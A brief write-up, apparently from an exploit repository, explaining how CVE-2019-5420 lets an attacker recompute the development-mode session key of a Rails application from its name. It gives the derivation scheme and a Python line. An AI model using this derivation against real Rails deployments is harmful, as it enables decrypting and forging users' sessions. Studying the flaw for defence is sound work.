# CVE-2019-5420
A vulnerability can allow an attacker to guess the automatically generated development mode secret token.

Ruby-on-Rails when it is running in development mode. In development mode, it is possible for an attacker to guess the key used to secure the sessions.

# Decryption:

## Key Generate:
Rails uses 3 environments (development,test,production), when an application uses development mode you are able to guess secret token and decrypt the encrypted session.

The key used to protect session is derived from the application's name.

Example:
```bash
rails new Jakom
```
Jakom: Application Name.

By this we can guess the key is output of the generation method:
```
PKDF2_HMAC_SHA1[ MD5 [ APPNAME + "::Application" ] , salt: "authenticated encrypted cookie" , iterations: 1000 , key's length: 32 ]
```
As we can see here:
```python
key = pbkdf2_hmac("sha1", md5_name.encode("utf-8"), "authenticated encrypted cookie".encode("utf-8"), 1000, 32)
```
